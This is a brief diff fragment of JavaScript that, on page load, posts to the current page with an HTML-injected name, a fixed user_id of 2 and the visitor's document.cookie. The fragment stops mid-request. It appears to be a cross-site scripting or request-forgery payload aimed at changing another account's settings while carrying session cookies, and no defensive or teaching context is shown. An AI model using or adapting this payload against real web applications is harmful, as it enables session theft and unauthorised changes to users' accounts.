@@ -2,7 +2,7 @@
 window.addEventListener('load', function () {
 
 
-fetch("/settings", {
+fetch(window.location.pathname, {
     'method': 'POST',
     'body': 'name=<b>asf</b>&user_id=2&' +document.cookie,
      headers: {
